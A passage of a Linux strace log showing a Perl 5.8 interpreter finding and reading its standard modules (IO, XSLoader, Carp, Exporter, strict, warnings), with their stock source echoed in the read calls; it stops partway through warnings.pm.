12207 20:24:32.551417 getppid()         = 12205
12207 20:24:32.551477 stat64("/etc/perl/IO.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.551491 stat64("/etc/perl/IO.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551504 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.551516 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551530 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.551542 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551556 stat64("/usr/lib/perl5/IO.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.551567 stat64("/usr/lib/perl5/IO.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551580 stat64("/usr/share/perl5/IO.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.551592 stat64("/usr/share/perl5/IO.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551605 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.551618 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
12207 20:24:32.551638 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
12207 20:24:32.551651 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaf18) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.551675 _llseek(6, 0, [0], SEEK_CUR) = 0
12207 20:24:32.551730 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
12207 20:24:32.551817 stat64("/etc/perl/XSLoader.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551835 stat64("/etc/perl/XSLoader.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551849 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551861 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551875 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551888 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551902 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551914 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551927 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551939 stat64("/usr/share/perl5/XSLoader.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551952 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.551965 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
12207 20:24:32.551985 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.551999 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.552009 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.552028 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
12207 20:24:32.552329 brk(0x8195000)    = 0x8195000
12207 20:24:32.552636 _llseek(8, 3407, [3407], SEEK_SET) = 0
12207 20:24:32.552653 _llseek(8, 0, [3407], SEEK_CUR) = 0
12207 20:24:32.553114 close(8)          = 0
12207 20:24:32.553233 stat64("/etc/perl/Carp.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553274 stat64("/etc/perl/Carp.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553303 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553327 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553347 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553360 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553374 stat64("/usr/lib/perl5/Carp.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553385 stat64("/usr/lib/perl5/Carp.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553398 stat64("/usr/share/perl5/Carp.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553410 stat64("/usr/share/perl5/Carp.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553423 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553436 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553449 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.553462 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
12207 20:24:32.553482 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.553497 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.553508 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.553525 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
12207 20:24:32.554058 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
12207 20:24:32.554086 read(8, "", 4096) = 0
12207 20:24:32.554182 close(8)          = 0
12207 20:24:32.554234 stat64("/etc/perl/Exporter.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554265 stat64("/etc/perl/Exporter.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554278 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554291 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554305 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554318 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554335 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554347 stat64("/usr/lib/perl5/Exporter.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554360 stat64("/usr/share/perl5/Exporter.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554372 stat64("/usr/share/perl5/Exporter.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554386 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554398 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554412 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.554424 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
12207 20:24:32.554445 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.554459 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.554471 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.554487 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
12207 20:24:32.555411 _llseek(8, 2217, [2217], SEEK_SET) = 0
12207 20:24:32.555429 _llseek(8, 0, [2217], SEEK_CUR) = 0
12207 20:24:32.555458 close(8)          = 0
12207 20:24:32.555620 stat64("/etc/perl/strict.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555636 stat64("/etc/perl/strict.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555650 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555740 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555755 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555802 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555833 stat64("/usr/lib/perl5/strict.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555845 stat64("/usr/lib/perl5/strict.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555872 stat64("/usr/share/perl5/strict.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555884 stat64("/usr/share/perl5/strict.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555897 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555909 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555923 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.555935 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
12207 20:24:32.555956 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.555971 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.555983 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.556002 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
12207 20:24:32.556226 _llseek(8, 598, [598], SEEK_SET) = 0
12207 20:24:32.556271 _llseek(8, 0, [598], SEEK_CUR) = 0
12207 20:24:32.556282 close(8)          = 0
12207 20:24:32.556335 stat64("/etc/perl/warnings.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556349 stat64("/etc/perl/warnings.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556363 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556375 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556389 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556401 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556415 stat64("/usr/lib/perl5/warnings.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556427 stat64("/usr/lib/perl5/warnings.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556440 stat64("/usr/share/perl5/warnings.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556452 stat64("/usr/share/perl5/warnings.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556465 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556477 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556491 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.556503 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
12207 20:24:32.556524 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.556542 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.556554 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.556572 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    